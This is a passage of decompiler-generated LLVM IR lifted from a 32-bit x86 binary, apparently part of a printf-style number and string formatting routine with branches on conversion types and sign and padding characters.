  %v7_804bf40 = or i32 %v6_804bf40, %v4_804bf40
  store i32 %v7_804bf40, i32* %edx.global-to-local, align 4
  %v3_804bf44 = add i32 %v0_804bf39, 7
  %v4_804bf44 = inttoptr i32 %v3_804bf44 to i8*
  store i8 %v3_804bf40, i8* %v4_804bf44, align 1
  %v0_804bf48.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bf48

dec_label_pc_804bf48:                             ; preds = %dec_label_pc_804bf34, %dec_label_pc_804bf40
  %v1_804bf61 = phi i32 [ %v0_804bf39, %dec_label_pc_804bf34 ], [ %v0_804bf48.pre, %dec_label_pc_804bf40 ]
  %v1_804bf48 = add i32 %v1_804bf61, 344
  %v2_804bf48 = inttoptr i32 %v1_804bf48 to i32*
  %v3_804bf48 = load i32, i32* %v2_804bf48, align 4
  store i32 %v3_804bf48, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804bf54 = add i32 %v3_804beac, -1
  %v8_804bf54 = icmp eq i32 %v1_804bf54, 0
  store i32 %v1_804bf54, i32* %ecx.global-to-local, align 4
  %v0_804bf61.pre = load i32, i32* @edi, align 4
  br i1 %v8_804bf54, label %dec_label_pc_804bf61, label %dec_label_pc_804bf57

dec_label_pc_804bf57:                             ; preds = %dec_label_pc_804bf48
  %v2_804bf57 = mul i32 %v0_804bf61.pre, 4
  %v3_804bf57 = add i32 %v1_804bf61, 52
  %v4_804bf57 = add i32 %v3_804bf57, %v2_804bf57
  %v5_804bf57 = inttoptr i32 %v4_804bf57 to i32*
  %v6_804bf57 = load i32, i32* %v5_804bf57, align 4
  %v1_804bf5b = and i32 %v6_804bf57, 3840
  store i32 %v1_804bf5b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bf61

dec_label_pc_804bf61:                             ; preds = %dec_label_pc_804bf48, %dec_label_pc_804bf57
  %v2_804bf61 = add i32 %v1_804bf61, -4
  %v3_804bf61 = inttoptr i32 %v2_804bf61 to i32*
  store i32 %v0_804bf61.pre, i32* %v3_804bf61, align 4
  %v0_804bf62 = load i32, i32* @esi, align 4
  %v2_804bf62 = add i32 %v1_804bf61, -8
  %v3_804bf62 = inttoptr i32 %v2_804bf62 to i32*
  store i32 %v0_804bf62, i32* %v3_804bf62, align 4
  %v0_804bf63 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bf63 = add i32 %v1_804bf61, -12
  %v3_804bf63 = inttoptr i32 %v2_804bf63 to i32*
  store i32 %v0_804bf63, i32* %v3_804bf63, align 4
  %v0_804bf64 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bf64 = add i32 %v1_804bf61, -16
  %v3_804bf64 = inttoptr i32 %v2_804bf64 to i32*
  store i32 %v0_804bf64, i32* %v3_804bf64, align 4
  %v0_804bf65 = call i32 @function_804f7b0()
  %v0_804bf6a = load i32, i32* @ebx, align 4
  %v1_804bf6a = load i32, i32* @esp, align 4
  %v2_804bf6a = inttoptr i32 %v1_804bf6a to i32*
  store i32 %v0_804bf6a, i32* %v2_804bf6a, align 4
  %v0_804bf6d = load i32, i32* @esi, align 4
  %v1_804bf6d = load i32, i32* @esp, align 4
  %v2_804bf6d = add i32 %v1_804bf6d, -4
  %v3_804bf6d = inttoptr i32 %v2_804bf6d to i32*
  store i32 %v0_804bf6d, i32* %v3_804bf6d, align 4
  %v0_804bf6e = load i32, i32* @edx, align 4
  %v2_804bf6e = add i32 %v1_804bf6d, -8
  %v3_804bf6e = inttoptr i32 %v2_804bf6e to i32*
  store i32 %v0_804bf6e, i32* %v3_804bf6e, align 4
  %v2_804bf6f = add i32 %v1_804bf6d, -12
  %v3_804bf6f = inttoptr i32 %v2_804bf6f to i32*
  store i32 %v0_804bf65, i32* %v3_804bf6f, align 4
  %v1_804bf70 = add i32 %v1_804bf6d, 347
  store i32 %v1_804bf70, i32* %eax.global-to-local, align 4
  %v2_804bf77 = add i32 %v1_804bf6d, -16
  %v3_804bf77 = inttoptr i32 %v2_804bf77 to i32*
  store i32 %v1_804bf70, i32* %v3_804bf77, align 4
  %v0_804bf78 = load i32, i32* %stack_var_-364, align 4
  %v5_804bf78 = inttoptr i32 %v0_804bf78 to i8*
  %v6_804bf78 = call i32 @function_804f848(i8* %v5_804bf78, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804bf78, i32* %eax.global-to-local, align 4
  %v0_804bf7d = load i32, i32* @esp, align 4
  %v1_804bf7d = add i32 %v0_804bf7d, 32
  store i32 %v6_804bf78, i32* @edi, align 4
  %v1_804bf82 = add i32 %v0_804bf7d, 80
  %v2_804bf82 = inttoptr i32 %v1_804bf82 to i32*
  %v3_804bf82 = load i32, i32* %v2_804bf82, align 4
  %tmp94 = icmp ult i32 %v3_804bf82, 6
  br i1 %tmp94, label %dec_label_pc_804bfb0, label %dec_label_pc_804bf89

dec_label_pc_804bf89:                             ; preds = %dec_label_pc_804bf61
  %v1_804bf89 = inttoptr i32 %v6_804bf78 to i8*
  %v2_804bf89 = load i8, i8* %v1_804bf89, align 1
  %v11_804bf89 = icmp eq i8 %v2_804bf89, 45
  %v1_804bf8c = icmp eq i1 %v11_804bf89, false
  %v1_804bf9b = add i32 %v0_804bf7d, 64
  %v2_804bf9b = inttoptr i32 %v1_804bf9b to i32*
  %v3_804bf9b = load i32, i32* %v2_804bf9b, align 4
  br i1 %v1_804bf8c, label %dec_label_pc_804bf9b, label %dec_label_pc_804bf8e

dec_label_pc_804bf8e:                             ; preds = %dec_label_pc_804bf89
  %v4_804bf8e = or i32 %v3_804bf9b, 2
  store i32 %v4_804bf8e, i32* %v2_804bf9b, align 4
  %v0_804bf93 = load i32, i32* @edi, align 4
  %v1_804bf93 = add i32 %v0_804bf93, 1
  store i32 %v1_804bf93, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804bfb0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bfb0

dec_label_pc_804bf9b:                             ; preds = %dec_label_pc_804bf89
  store i32 %v3_804bf9b, i32* %eax.global-to-local, align 4
  %v2_804bf9f = and i32 %v3_804bf9b, 2
  %v3_804bf9f = icmp eq i32 %v2_804bf9f, 0
  br i1 %v3_804bf9f, label %dec_label_pc_804bfa7, label %dec_label_pc_804bfa3

dec_label_pc_804bfa3:                             ; preds = %dec_label_pc_804bf9b
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804bfb0

dec_label_pc_804bfa7:                             ; preds = %dec_label_pc_804bf9b
  %v2_804bfa7 = urem i32 %v3_804bf9b, 2
  %v3_804bfa7 = icmp eq i32 %v2_804bfa7, 0
  br i1 %v3_804bfa7, label %dec_label_pc_804bfb0, label %dec_label_pc_804bfab

dec_label_pc_804bfab:                             ; preds = %dec_label_pc_804bfa7
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804bfb0

dec_label_pc_804bfb0:                             ; preds = %dec_label_pc_804bfa7, %dec_label_pc_804bf61, %dec_label_pc_804bfa3, %dec_label_pc_804bf8e, %dec_label_pc_804bfab
  %v0_804c003 = phi i32 [ %v6_804bf78, %dec_label_pc_804bfa7 ], [ %v6_804bf78, %dec_label_pc_804bf61 ], [ %v6_804bf78, %dec_label_pc_804bfa3 ], [ %v1_804bf93, %dec_label_pc_804bf8e ], [ %v6_804bf78, %dec_label_pc_804bfab ]
  %v0_804c012 = phi i32 [ %v1_804bf7d, %dec_label_pc_804bfa7 ], [ %v1_804bf7d, %dec_label_pc_804bf61 ], [ %v1_804bf7d, %dec_label_pc_804bfa3 ], [ %v0_804bfb0.pre, %dec_label_pc_804bf8e ], [ %v1_804bf7d, %dec_label_pc_804bfab ]
  %v1_804bfb0 = add i32 %v0_804c012, 204
  store i32 %v1_804bfb0, i32* %ecx.global-to-local, align 4
  %v1_804bfb7 = add i32 %v0_804c012, 20
  %v2_804bfb7 = inttoptr i32 %v1_804bfb7 to i32*
  %v3_804bfb7 = load i32, i32* %v2_804bfb7, align 4
  store i32 %v3_804bfb7, i32* %edx.global-to-local, align 4
  %v2_804bfbb = sub i32 %v1_804bfb0, %v0_804c003
  store i32 %v2_804bfbb, i32* %ecx.global-to-local, align 4
  %v2_804bfbd = icmp slt i32 %v3_804bfb7, 0
  %v1_804bfbf = add i32 %v2_804bfbb, 127
  store i32 %v1_804bfbf, i32* @esi, align 4
  %v1_804bfc2 = icmp eq i1 %v2_804bfbd, false
  br i1 %v1_804bfc2, label %dec_label_pc_804bfc9, label %dec_label_pc_804bfc4

dec_label_pc_804bfc4:                             ; preds = %dec_label_pc_804bfb0
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bfc9

dec_label_pc_804bfc9:                             ; preds = %dec_label_pc_804bfb0, %dec_label_pc_804bfc4
  %v0_804bfef = phi i32 [ %v3_804bfb7, %dec_label_pc_804bfb0 ], [ 1, %dec_label_pc_804bfc4 ]
  %v1_804bfc9 = add i32 %v0_804c012, 32
  %v2_804bfc9 = inttoptr i32 %v1_804bfc9 to i8*
  %v3_804bfc9 = load i8, i8* %v2_804bfc9, align 1
  %v4_804bfc9 = and i8 %v3_804bfc9, 16
  %v5_804bfc9 = icmp eq i8 %v4_804bfc9, 0
  br i1 %v5_804bfc9, label %dec_label_pc_804c003, label %dec_label_pc_804bfd0

dec_label_pc_804bfd0:                             ; preds = %dec_label_pc_804bfc9
  %v1_804bfd0 = add i32 %v0_804c012, 48
  %v2_804bfd0 = inttoptr i32 %v1_804bfd0 to i32*
  %v3_804bfd0 = load i32, i32* %v2_804bfd0, align 4
  store i32 %v3_804bfd0, i32* %eax.global-to-local, align 4
  %tmp95 = icmp ult i32 %v3_804bfd0, 3
  br i1 %tmp95, label %dec_label_pc_804bfea.thread, label %dec_label_pc_804bfde

dec_label_pc_804bfea.thread:                      ; preds = %dec_label_pc_804bfd0
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804c003

dec_label_pc_804bfde:                             ; preds = %dec_label_pc_804bfd0
  %v9_804bfde = icmp eq i32 %v3_804bfd0, 3
  %v1_804bfe1 = icmp eq i1 %v9_804bfde, false
  br i1 %v1_804bfe1, label %dec_label_pc_804bfea, label %dec_label_pc_804bfe3

dec_label_pc_804bfe3:                             ; preds = %dec_label_pc_804bfde
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804c003

dec_label_pc_804bfea:                             ; preds = %dec_label_pc_804bfde
  %v9_804bfea = icmp eq i32 %v3_804bfd0, 4
  %v1_804bfed = icmp eq i1 %v9_804bfea, false
  br i1 %v1_804bfed, label %dec_label_pc_804c003, label %dec_label_pc_804bfef

dec_label_pc_804bfef:                             ; preds = %dec_label_pc_804bfea
  %tmp96 = icmp ugt i32 %v0_804bfef, %v1_804bfbf
  br i1 %tmp96, label %dec_label_pc_804c003, label %dec_label_pc_804bff3

dec_label_pc_804bff3:                             ; preds = %dec_label_pc_804bfef
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804bff8 = inttoptr i32 %v0_804c003 to i8*
  %v2_804bff8 = load i8, i8* %v1_804bff8, align 1
  %v8_804bff8 = icmp eq i8 %v2_804bff8, 48
  br i1 %v8_804bff8, label %dec_label_pc_804c003, label %dec_label_pc_804bffd

dec_label_pc_804bffd:                             ; preds = %dec_label_pc_804bff3
  %v1_804bffd = add i32 %v2_804bfbb, 128
  store i32 %v1_804bffd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c003

dec_label_pc_804c003:                             ; preds = %dec_label_pc_804bfea.thread, %dec_label_pc_804bfef, %dec_label_pc_804bff3, %dec_label_pc_804bfea, %dec_label_pc_804bfc9, %dec_label_pc_804bfe3, %dec_label_pc_804bffd
  %v0_804c03b = phi i32 [ %v0_804bfef, %dec_label_pc_804bfef ], [ 1, %dec_label_pc_804bff3 ], [ %v0_804bfef, %dec_label_pc_804bfea ], [ %v0_804bfef, %dec_label_pc_804bfc9 ], [ %v0_804bfef, %dec_label_pc_804bfe3 ], [ %v1_804bffd, %dec_label_pc_804bffd ], [ %v0_804bfef, %dec_label_pc_804bfea.thread ]
  %v1_804c003 = inttoptr i32 %v0_804c003 to i8*
  %v2_804c003 = load i8, i8* %v1_804c003, align 1
  %v8_804c003 = icmp eq i8 %v2_804c003, 48
  %v1_804c006 = icmp eq i1 %v8_804c003, false
  br i1 %v1_804c006, label %dec_label_pc_804c033, label %dec_label_pc_804c008

dec_label_pc_804c008:                             ; preds = %dec_label_pc_804c003
  %v0_804c008 = load i32, i32* @ebp, align 4
  %v7_804c00b = icmp sgt i32 %v0_804c008, 5
  br i1 %v7_804c00b, label %dec_label_pc_804c00d, label %dec_label_pc_804c012

dec_label_pc_804c00d:                             ; preds = %dec_label_pc_804c008
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804c012

dec_label_pc_804c012:                             ; preds = %dec_label_pc_804c008, %dec_label_pc_804c00d
  %v1_804c012 = add i32 %v0_804c012, 48
  %v2_804c012 = inttoptr i32 %v1_804c012 to i32*
  %v3_804c012 = load i32, i32* %v2_804c012, align 4
  %v12_804c012 = icmp eq i32 %v3_804c012, 1
  %v1_804c017 = icmp eq i1 %v12_804c012, false
  br i1 %v1_804c017, label %dec_label_pc_804c028, label %dec_label_pc_804c019

dec_label_pc_804c019:                             ; preds = %dec_label_pc_804c012
  store i32 ptrtoint ([6 x i8]* @global_var_8053024.119 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804c1a4

dec_label_pc_804c028:                             ; preds = %dec_label_pc_804c012
  %v1_804c028 = icmp eq i32 %v0_804c03b, 0
  %v1_804c02a = icmp eq i1 %v1_804c028, false
  br i1 %v1_804c02a, label %dec_label_pc_804c033, label %dec_label_pc_804c02c

dec_label_pc_804c02c:                             ; preds = %dec_label_pc_804c028
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c1a4

dec_label_pc_804c033:                             ; preds = %dec_label_pc_804c028, %dec_label_pc_804c003
  %v2_804c033 = sub i32 %v0_804c03b, %v1_804bfbf
  %v7_804c033 = icmp ult i32 %v0_804c03b, %v1_804bfbf
  %v12_804c033 = icmp eq i32 %v2_804c033, 0
  %v2_804c035 = or i1 %v7_804c033, %v12_804c033
  br i1 %v2_804c035, label %dec_label_pc_804c1a4, label %dec_label_pc_804c03b

dec_label_pc_804c03b:                             ; preds = %dec_label_pc_804c033
  store i32 %v2_804c033, i32* @ebx, align 4
  br label %dec_label_pc_804c1be

dec_label_pc_804c044:                             ; preds = %dec_label_pc_804beda
  %tmp97 = icmp ult i32 %v3_804beac, 16
  br i1 %tmp97, label %dec_label_pc_804c049, label %dec_label_pc_804c08e

dec_label_pc_804c049:                             ; preds = %dec_label_pc_804c044
  %v1_804c049 = add i32 %v0_804beac.lcssa, 33
  %v2_804c049 = inttoptr i32 %v1_804c049 to i8*
  %v3_804c049 = load i8, i8* %v2_804c049, align 1
  %v4_804c049 = and i8 %v3_804c049, 8
  %v5_804c049 = icmp eq i8 %v4_804c049, 0
  %v1_804c04e = add i32 %v0_804beac.lcssa, 344
  %v2_804c04e = inttoptr i32 %v1_804c04e to i32*
  %v3_804c04e = load i32, i32* %v2_804c04e, align 4
  store i32 %v3_804c04e, i32* %edx.global-to-local, align 4
  br i1 %v5_804c049, label %dec_label_pc_804c05b, label %dec_label_pc_804c057

dec_label_pc_804c057:                             ; preds = %dec_label_pc_804c049
  %v1_804c057 = inttoptr i32 %v3_804c04e to x86_fp80*
  %v2_804c057 = load x86_fp80, x86_fp80* %v1_804c057, align 4
  br label %dec_label_pc_804c05d

dec_label_pc_804c05b:                             ; preds = %dec_label_pc_804c049
  %v1_804c05b = inttoptr i32 %v3_804c04e to double*
  %v2_804c05b = load double, double* %v1_804c05b, align 4
  %v3_804c05b = fpext double %v2_804c05b to x86_fp80
  br label %dec_label_pc_804c05d

dec_label_pc_804c05d:                             ; preds = %dec_label_pc_804c057, %dec_label_pc_804c05b
  %storemerge4 = phi x86_fp80 [ %v2_804c057, %dec_label_pc_804c057 ], [ %v3_804c05b, %dec_label_pc_804c05b ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804c05d = load i32, i32* @esi, align 4
  %v2_804c05d = add i32 %v0_804beac.lcssa, -4
  %v3_804c05d = inttoptr i32 %v2_804c05d to i32*
  store i32 %v0_804c05d, i32* %v3_804c05d, align 4
  %v0_804c05e = load i32, i32* @esi, align 4
  %v2_804c05e = add i32 %v0_804beac.lcssa, -8
  %v3_804c05e = inttoptr i32 %v2_804c05e to i32*
  store i32 %v0_804c05e, i32* %v3_804c05e, align 4
  %v1_804c05f = add i32 %v0_804beac.lcssa, -12
  %v2_804c05f = inttoptr i32 %v1_804c05f to i32*
  store i32 134528290, i32* %v2_804c05f, align 4
  %v1_804c064 = add i32 %v0_804beac.lcssa, 20
  store i32 %v1_804c064, i32* %eax.global-to-local, align 4
  %v2_804c068 = add i32 %v0_804beac.lcssa, -16
  %v3_804c068 = inttoptr i32 %v2_804c068 to i32*
  store i32 %v1_804c064, i32* %v3_804c068, align 4
  %v1_804c069 = add i32 %v0_804beac.lcssa, -28
  %v1_804c06c = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804c06c = inttoptr i32 %v1_804c069 to x86_fp80*
  store x86_fp80 %v1_804c06c, x86_fp80* %v3_804c06c, align 4
  %v1_804c06f = add i32 %v0_804beac.lcssa, 368
  %v2_804c06f = inttoptr i32 %v1_804c06f to i32*
  %v3_804c06f = load i32, i32* %v2_804c06f, align 4
  %v5_804c06f = add i32 %v0_804beac.lcssa, -32
  %v6_804c06f = inttoptr i32 %v5_804c06f to i32*
  store i32 %v3_804c06f, i32* %v6_804c06f, align 4
  %v0_804c076 = call i32 @function_804f91c()
  store i32 %v0_804c076, i32* %eax.global-to-local, align 4
  %v0_804c07b = load i32, i32* @esp, align 4
  %v1_804c07b = add i32 %v0_804c07b, 32
  %v2_804c07e = icmp slt i32 %v0_804c076, 0
  br i1 %v2_804c07e, label %dec_label_pc_804c31f, label %dec_label_pc_804c086

dec_label_pc_804c086:                             ; preds = %dec_label_pc_804c05d
  %v1_804c086 = inttoptr i32 %v1_804c07b to i32*
  %v2_804c086 = load i32, i32* %v1_804c086, align 4
  %v4_804c086 = add i32 %v2_804c086, %v0_804c076
  store i32 %v4_804c086, i32* %v1_804c086, align 4
  %v0_804c30c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c30c

dec_label_pc_804c08e:                             ; preds = %dec_label_pc_804c044
  %tmp98 = or i32 %v3_804beac, 1
  %tmp99 = icmp eq i32 %tmp98, 17
  br i1 %tmp99, label %dec_label_pc_804c097, label %dec_label_pc_804c12a

dec_label_pc_804c097:                             ; preds = %dec_label_pc_804c08e
  %v9_804c08e = icmp eq i32 %v3_804beac, 17
  %v1_804c097 = add i32 %v0_804beac.lcssa, 332
  %v2_804c097 = inttoptr i32 %v1_804c097 to i32*
  store i32 0, i32* %v2_804c097, align 4
  %v0_804c0a2 = load i32, i32* @esp, align 4
  %v1_804c0a2 = add i32 %v0_804c0a2, 344
  %v2_804c0a2 = inttoptr i32 %v1_804c0a2 to i32*
  %v3_804c0a2 = load i32, i32* %v2_804c0a2, align 4
  store i32 %v3_804c0a2, i32* %edx.global-to-local, align 4
  %v1_804c0a9 = icmp eq i1 %v9_804c08e, false
  br i1 %v1_804c0a9, label %dec_label_pc_804c0f5, label %dec_label_pc_804c0ab

dec_label_pc_804c0ab:                             ; preds = %dec_label_pc_804c097
  %v1_804c0ab = inttoptr i32 %v3_804c0a2 to i32*
  %v2_804c0ab = load i32, i32* %v1_804c0ab, align 4
  store i32 %v2_804c0ab, i32* %eax.global-to-local, align 4
  %v2_804c0ad = add i32 %v0_804c0a2, 340
  %v3_804c0ad = inttoptr i32 %v2_804c0ad to i32*
  store i32 %v2_804c0ab, i32* %v3_804c0ad, align 4
  %v0_804c0b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c0b4 = icmp eq i32 %v0_804c0b4, 0
  br i1 %v1_804c0b4, label %dec_label_pc_804c1a8, label %dec_label_pc_804c0bc

dec_label_pc_804c0bc:                             ; preds = %dec_label_pc_804c0ab
  %v0_804c0bc = load i32, i32* @esp, align 4
  %v1_804c0bc = add i32 %v0_804c0bc, 20
  %v2_804c0bc = inttoptr i32 %v1_804c0bc to i32*
  %v3_804c0bc = load i32, i32* %v2_804c0bc, align 4
  store i32 %v3_804c0bc, i32* %eax.global-to-local, align 4
  %v2_804c0c3 = icmp slt i32 %v3_804c0bc, 0
  br i1 %v2_804c0c3, label %dec_label_pc_804c0c9, label %dec_label_pc_804c0c7

dec_label_pc_804c0c7:                             ; preds = %dec_label_pc_804c0bc
  br label %dec_label_pc_804c0c9

dec_label_pc_804c0c9:                             ; preds = %dec_label_pc_804c0bc, %dec_label_pc_804c0c7
  %storemerge103 = phi i32 [ %v3_804c0bc, %dec_label_pc_804c0c7 ], [ -1, %dec_label_pc_804c0bc ]
  store i32 %storemerge103, i32* %ecx.global-to-local, align 4
  %v1_804c0c9 = add i32 %v0_804c0bc, 340
  store i32 %v1_804c0c9, i32* %edx.global-to-local, align 4
  %v1_804c0d0 = add i32 %v0_804c0bc, 332
  store i32 %v1_804c0d0, i32* %eax.global-to-local, align 4
  %v2_804c0d7 = add i32 %v0_804c0bc, -4
  %v3_804c0d7 = inttoptr i32 %v2_804c0d7 to i32*
  store i32 %v1_804c0d0, i32* %v3_804c0d7, align 4
  %v0_804c0d8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c0d8 = add i32 %v0_804c0bc, -8
  %v3_804c0d8 = inttoptr i32 %v2_804c0d8 to i32*
  store i32 %v0_804c0d8, i32* %v3_804c0d8, align 4
  %v0_804c0d9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c0d9 = add i32 %v0_804c0bc, -12
  %v3_804c0d9 = inttoptr i32 %v2_804c0d9 to i32*
  store i32 %v0_804c0d9, i32* %v3_804c0d9, align 4
  %v0_804c0da = load i32, i32* %edx.global-to-local, align 4
  %v2_804c0da = add i32 %v0_804c0bc, -16
  %v3_804c0da = inttoptr i32 %v2_804c0da to i32*
  store i32 %v0_804c0da, i32* %v3_804c0da, align 4
  %v0_804c0db = call i32 @function_804f4c4()
  store i32 %v0_804c0db, i32* %eax.global-to-local, align 4
  %v0_804c0e0 = load i32, i32* @esp, align 4
  %v1_804c0e0 = add i32 %v0_804c0e0, 16
  store i32 %v0_804c0db, i32* @esi, align 4
  %v10_804c0e5 = icmp eq i32 %v0_804c0db, -1
  br i1 %v10_804c0e5, label %dec_label_pc_804c31f, label %dec_label_pc_804c0ee

dec_label_pc_804c0ee:                             ; preds = %dec_label_pc_804c0c9
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804c1b2

dec_label_pc_804c0f5:                             ; preds = %dec_label_pc_804c097
  %v0_804c0f5 = load i32, i32* @ebx, align 4
  %v2_804c0f5 = add i32 %v0_804c0a2, -4
  %v3_804c0f5 = inttoptr i32 %v2_804c0f5 to i32*
  store i32 %v0_804c0f5, i32* %v3_804c0f5, align 4
  %v1_804c0f6 = add i32 %v0_804c0a2, 332
  store i32 %v1_804c0f6, i32* %eax.global-to-local, align 4
  %v2_804c0fd = add i32 %v0_804c0a2, -8
  %v3_804c0fd = inttoptr i32 %v2_804c0fd to i32*
  store i32 %v1_804c0f6, i32* %v3_804c0fd, align 4
  %v0_804c0fe = load i32, i32* %edx.global-to-local, align 4
  %v1_804c0fe = inttoptr i32 %v0_804c0fe to i32*
  %v2_804c0fe = load i32, i32* %v1_804c0fe, align 4
  %v4_804c0fe = add i32 %v0_804c0a2, -12
  %v5_804c0fe = inttoptr i32 %v4_804c0fe to i32*
  store i32 %v2_804c0fe, i32* %v5_804c0fe, align 4
  %v1_804c100 = add i32 %v0_804c0a2, 204
  store i32 %v1_804c100, i32* @ebx, align 4
  %v2_804c107 = add i32 %v0_804c0a2, -16
  %v3_804c107 = inttoptr i32 %v2_804c107 to i32*
  store i32 %v1_804c100, i32* %v3_804c107, align 4
  %v0_804c108 = call i32 @function_804f480()
  store i32 %v0_804c108, i32* %eax.global-to-local, align 4
  %v0_804c10d = load i32, i32* @esp, align 4
  %v1_804c10d = add i32 %v0_804c10d, 16
  store i32 %v0_804c108, i32* @esi, align 4
  %v10_804c112 = icmp eq i32 %v0_804c108, -1
  br i1 %v10_804c112, label %dec_label_pc_804c31f, label %dec_label_pc_804c11b

dec_label_pc_804c11b:                             ; preds = %dec_label_pc_804c0f5
  %v0_804c11b = load i32, i32* @ebx, align 4
  store i32 %v0_804c11b, i32* @edi, align 4
  %v2_804c11d = add i32 %v0_804c108, 220
  %v3_804c11d = add i32 %v2_804c11d, %v0_804c10d
  %v4_804c11d = inttoptr i32 %v3_804c11d to i8*
  store i8 0, i8* %v4_804c11d, align 1
  br label %dec_label_pc_804c1b2

dec_label_pc_804c12a:                             ; preds = %dec_label_pc_804c08e
  %tmp100 = icmp ult i32 %v3_804beac, 20
  br i1 %tmp100, label %dec_label_pc_804c12f, label %dec_label_pc_804c17a

dec_label_pc_804c12f:                             ; preds = %dec_label_pc_804c12a
  %v9_804c12a = icmp eq i32 %v3_804beac, 19
  %v1_804c12f = add i32 %v0_804beac.lcssa, 344
  %v2_804c12f = inttoptr i32 %v1_804c12f to i32*
  %v3_804c12f = load i32, i32* %v2_804c12f, align 4
  store i32 %v3_804c12f, i32* %edx.global-to-local, align 4
  %v1_804c136 = icmp eq i1 %v9_804c12a, false
  %v1_804c15b = inttoptr i32 %v3_804c12f to i32*
  %v2_804c15b = load i32, i32* %v1_804c15b, align 4
  br i1 %v1_804c136, label %dec_label_pc_804c15b, label %dec_label_pc_804c138

dec_label_pc_804c138:                             ; preds = %dec_label_pc_804c12f
  store i32 %v2_804c15b, i32* @edi, align 4
  %v1_804c13a = icmp eq i32 %v2_804c15b, 0
  br i1 %v1_804c13a, label %dec_label_pc_804c1a8, label %dec_label_pc_804c13e

dec_label_pc_804c13e:                             ; preds = %dec_label_pc_804c138, %dec_label_pc_804c183
  %v1_804c14b = phi i32 [ %v0_804beac.lcssa, %dec_label_pc_804c138 ], [ %v1_804c19d, %dec_label_pc_804c183 ]
  %v1_804c13e = add i32 %v1_804c14b, 20
  %v2_804c13e = inttoptr i32 %v1_804c13e to i32*
  %v3_804c13e = load i32, i32* %v2_804c13e, align 4
  store i32 %v3_804c13e, i32* %eax.global-to-local, align 4
  %v2_804c145 = icmp slt i32 %v3_804c13e, 0
  br i1 %v2_804c145, label %dec_label_pc_804c14b, label %dec_label_pc_804c149

dec_label_pc_804c149:                             ; preds = %dec_label_pc_804c13e
  br label %dec_label_pc_804c14b

dec_label_pc_804c14b:                             ; preds = %dec_label_pc_804c13e, %dec_label_pc_804c149
  %storemerge = phi i32 [ %v3_804c13e, %dec_label_pc_804c149 ], [ -1, %dec_label_pc_804c13e ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804c14b = add i32 %v1_804c14b, -4
  %v3_804c14b = inttoptr i32 %v2_804c14b to i32*
  store i32 %v3_804beac, i32* %v3_804c14b, align 4
  %v2_804c14c = add i32 %v1_804c14b, -8
  %v3_804c14c = inttoptr i32 %v2_804c14c to i32*
  store i32 %v3_804beac, i32* %v3_804c14c, align 4
  %v0_804c14d = load i32, i32* %edx.global-to-local, align 4
  %v2_804c14d = add i32 %v1_804c14b, -12
  %v3_804c14d = inttoptr i32 %v2_804c14d to i32*
  store i32 %v0_804c14d, i32* %v3_804c14d, align 4
  %v0_804c14e = load i32, i32* @edi, align 4
  %v2_804c14e = add i32 %v1_804c14b, -16
  %v3_804c14e = inttoptr i32 %v2_804c14e to i32*
  store i32 %v0_804c14e, i32* %v3_804c14e, align 4
  %v0_804c14f = call i32 @function_804ced0()
  store i32 %v0_804c14f, i32* %eax.global-to-local, align 4
  store i32 %v0_804c14f, i32* @esi, align 4
  br label %dec_label_pc_804c1b2

dec_label_pc_804c15b:                             ; preds = %dec_label_pc_804c12f
  store i32 %v2_804c15b, i32* %eax.global-to-local, align 4
  %v1_804c15d = add i32 %v0_804beac.lcssa, 204
  store i32 %v1_804c15d, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804c169 = trunc i32 %v2_804c15b to i8
  %v4_804c169 = inttoptr i32 %v1_804c15d to i8*
  store i8 %v1_804c169, i8* %v4_804c169, align 1
  %v0_804c170 = load i32, i32* @esp, align 4
  %v1_804c170 = add i32 %v0_804c170, 205
  %v2_804c170 = inttoptr i32 %v1_804c170 to i8*
  store i8 0, i8* %v2_804c170, align 1
  br label %dec_label_pc_804c1b2

dec_label_pc_804c17a:                             ; preds = %dec_label_pc_804c12a
  %v9_804c17a = icmp eq i32 %v3_804beac, 20
  %v1_804c17d = icmp eq i1 %v9_804c17a, false
  br i1 %v1_804c17d, label %dec_label_pc_804c31f, label %dec_label_pc_804c183

dec_label_pc_804c183:                             ; preds = %dec_label_pc_804c17a
  %v0_804c183 = load i32, i32* %stack_var_-364, align 4
  %v1_804c183 = call i32 @function_804b4bc(i32 %v0_804c183)
  store i32 %v1_804c183, i32* %eax.global-to-local, align 4
  %v0_804c188 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c188 = load i32, i32* @esp, align 4
  %v2_804c188 = add i32 %v1_804c188, -4
  %v3_804c188 = inttoptr i32 %v2_804c188 to i32*
  store i32 %v0_804c188, i32* %v3_804c188, align 4
  %v1_804c189 = add i32 %v1_804c188, -8
  %v2_804c189 = inttoptr i32 %v1_804c189 to i32*
  store i32 128, i32* %v2_804c189, align 4
  %v1_804c18e = add i32 %v1_804c188, 204
  store i32 %v1_804c18e, i32* %edx.global-to-local, align 4
